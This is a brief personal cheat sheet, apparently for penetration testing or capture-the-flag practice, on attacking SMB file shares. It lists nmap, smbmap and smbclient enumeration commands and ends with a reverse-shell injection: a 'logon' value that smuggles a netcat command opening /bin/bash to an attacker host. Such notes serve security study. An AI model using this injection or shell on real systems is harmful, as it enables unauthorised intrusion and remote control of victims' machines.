
# smb
- **normally runs on ports 139 and 445**
- trying to find a file share you can either upload or download to
- download important looking files to gather information
- upload shell script code to get a low level shell

## What is it?
- put simply, it's a file transfer protocol

## Enumeration
- this specific protocol has a ton of nmap enumoration scripts (I'll list a bunch below)
  - nmap --script smb-vuln* [ip] -p [ports]
  - nmap --script smb-os-disc* [ip] -p [ports]
  - nmap --script smb-enum* [ip] -p [ports]
- smbmap -H [ip]
  - maps the smb shares 
  - shows permissions, drives, etc
- smbclient -L [ip]
  - an ftp like interface to interact with shares
  
## simple commands
- can only work if you get an open share with permissions
- use smbclient to connect
- smbclient \\\\[ip]\\[share name]
  - you need a rediculous amount of slashes sometimes due to how things get parsed

## Reverse Shell
- if under the help command you see the command "logon" you may be able to get a shell
  - logon "/=`nc [attack box ip] 4444 -e /bin/bash`"